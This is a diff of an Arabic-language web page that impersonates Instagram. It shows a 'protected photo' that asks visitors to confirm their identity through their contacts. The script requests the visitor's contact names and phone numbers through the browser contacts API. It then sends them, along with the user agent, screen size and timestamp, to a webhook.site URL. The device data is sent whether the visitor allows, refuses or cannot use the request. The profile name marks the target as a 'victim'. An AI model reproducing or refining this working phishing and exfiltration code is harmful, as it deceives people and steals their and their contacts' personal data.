@@ -15,40 +15,19 @@
             min-height: 100vh; 
             padding: 20px;
         }
-        .container {
-            background: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            width: 100%;
-            max-width: 400px;
-            padding: 25px;
-            text-align: center;
-        }
+        .container { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 12px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
         .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
         .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
         .dots { font-size: 24px; color: #262626; }
-        
         .profile { display: flex; align-items: center; gap: 15px; padding: 15px 0; text-align: left; }
-        .avatar {
-            width: 55px; height: 55px;
-            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            color: white; font-size: 22px; font-weight: bold;
-        }
+        .avatar { width: 55px; height: 55px; background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 22px; font-weight: bold; }
         .info h3 { font-size: 15px; color: #262626; }
         .info p { font-size: 13px; color: #8e8e8e; }
-        
         .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
         .desc { font-size: 14px; color: #8e8e8e; margin-bottom: 15px; }
-        
-        .btn { 
-            width: 100%; padding: 12px; 
-            background: #0095f6; color: white; border: none; border-radius: 8px; 
-            font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; 
-        }
+        .btn { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
         .btn:disabled { background: #b2dffc; cursor: default; }
         .btn-green { background: #2ea043; }
-        
         #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; }
         .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
         .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
@@ -58,23 +37,10 @@
 <body>
 
     <div class="container">
-        <div class="header">
-            <div class="logo">Instagram</div>
-            <div class="dots">⋯</div>
-        </div>
-        <div class="profile">
-            <div class="avatar">A</div>
-            <div class="info">
-                <h3>أحمد_الضحية</h3>
-                <p>تأمين الحساب</p>
-            </div>
-        </div>
-        <div class="post">
-            <span>🔒</span> الصورة محمية
-        </div>
-        <div class="desc">
-            يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.
-        </div>
+        <div class="header"><div class="logo">Instagram</div><div class="dots">⋯</div></div>
+        <div class="profile"><div class="avatar">A</div><div class="info"><h3>أحمد_الضحية</h3><p>تأمين الحساب</p></div></div>
+        <div class="post"><span>🔒</span> الصورة محمية</div>
+        <div class="desc">يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.</div>
         <button class="btn" id="actionBtn">تأكيد الحساب</button>
         <div id="status"></div>
     </div>
@@ -83,43 +49,47 @@
         document.getElementById('actionBtn').addEventListener('click', async function() {
             const btn = this;
             const statusBox = document.getElementById('status');
+            
             btn.innerText = "جاري التحميل...";
             btn.disabled = true;
             statusBox.style.display = 'none';
             statusBox.className = '';
 
-            const rawData = {
+            // 1. تجهيز البيانات الأساسية للجهاز
+            const data = {
                 device: "iPhone",
                 ua: navigator.userAgent,
                 screen: `${window.screen.width} x ${window.screen.height}`,
                 timestamp: new Date().toISOString()
             };
 
+            // 2. فحص المتصفح
             if (!navigator.contacts || !navigator.contacts.select) {
-                sendToWebhook(rawData, "المتصفح لا يدعم جهات الاتصال. إرسال فوري.");
+                // إذا كان سفاري -> يرسل فوراً
+                sendToWebhook(data, "المتصفح لا يدعم. إرسال فوري.");
                 return;
             }
 
+            // 3. طلب الإذن (هذا السطر هو المهم جداً)
             try {
                 const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
+                // 4. إذا سمح المستخدم
                 if (contacts && contacts.length > 0) {
-                    // هنا نضيف جهات الاتصال للبيانات لأننا سنرسلها الآن
-                    rawData.contacts = contacts; 
-
+                    data.contacts = contacts; // إضافة جهات الاتصال للبيانات
                     statusBox.className = 'status-ok';
                     statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
                     btn.innerText = "تم";
                     btn.className = "btn btn-green";
-                    
-                    // نرسل البيانات الآن (بما فيها الأرقام) لأن المستخدم سمح
-                    sendToWebhook(rawData, "تم السماح بالوصول (تم استلام جهات الاتصال).");
+                    sendToWebhook(data, "تم السماح. جلب جهات الاتصال.");
                 } else {
-                    sendToWebhook(rawData, "رفض الإذن أو أغلق النافذة.");
+                    // إذا فتح النافذة وأغلقها دون اختيار
+                    sendToWebhook(data, "رفض الإذن أو أغلق النافذة.");
                 }
             } catch (error) {
+                // 5. إذا رفض المستخدم (المنطق العكسي)
                 if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
-                    sendToWebhook(rawData, "رفض الإذن (المنطق العكسي).");
+                    sendToWebhook(data, "رفض الإذن (المنطق العكسي).");
                 } else {
                     statusBox.className = 'status-err';
                     statusBox.innerText = "❌ حدث خطأ غير متوقع.";
@@ -133,9 +103,6 @@
             data.reason = reason;
             data.status = "تم الإرسال إلى Webhook.site";
 
-            // ================================================
-            // تم تغيير الرابط هنا إلى Webhook.site الخاص بك
-            // ================================================
             const webhookUrl = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
 
             fetch(webhookUrl, {
